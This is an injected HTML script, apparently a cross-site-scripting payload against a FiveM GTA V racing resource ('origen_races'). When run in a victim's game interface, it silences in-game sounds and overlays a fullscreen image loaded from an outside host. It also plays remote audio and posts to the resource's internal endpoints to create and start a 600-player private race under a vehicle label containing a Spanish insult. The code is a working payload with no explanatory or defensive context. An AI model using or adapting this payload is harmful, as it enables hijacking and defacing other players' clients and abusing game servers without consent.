<script>
[sound_invitacion, sound_second, sound_start, sound_over, sound_click, sound_transition, sound_transition2, pop].forEach(a => a.volume = 0);

const eee=document.createElement('img');
eee.src='https://i.postimg.cc/cC71Lnzf/adssad-1.png';
Object.assign(eee.style,{position:'fixed',top:0,left:0,width:'100vw',height:'100vh',objectFit:'cover',zIndex:9999});
document.body.appendChild(eee);
const a=new Audio('https://github.com/alvarilloo/video/raw/refs/heads/main/aaa.mp3');
a.play();
let t=!1;

$.post("https://origen_races/new-race", JSON.stringify({
	raceid: "14",
	vueltas: "1",
	clima: "CLEAR",
	hora: "12",
	explosiones: "sin-explosiones",
	accesible: "privada",
	img: "https://prod.cloud.rockstargames.com/ugc/gta5mission/5131/NoAH41FpvUyay6kP6Q0-1Q/2_0.jpg",
	modo: "normal",
	name: "Verwandlung - Zwiegespalten",
	maxplayers: 600,
	vehiculo: "aleatorio"
}), function (cb) {
	if (cb) {
		crearSala(
			cb,
			"https://prod.cloud.rockstargames.com/ugc/gta5mission/5131/NoAH41FpvUyay6kP6Q0-1Q/2_0.jpg",
			"Verwandlung - Zwiegespalten",
			"1",
			"CLEAR",
			"12",
			"sin-explosiones",
			"privada",
			"normal",
			16,
			"aleatorio"
		);

		setTimeout(() => {
			$.post("https://origen_races/SelectVeh", JSON.stringify({
				model: "1336872304",
				label: "pollaca tus muertos"
			}));

			$.post("https://origen_races/start-race",
				JSON.stringify({})
			);
		}, 4000)
	}
});

</script>
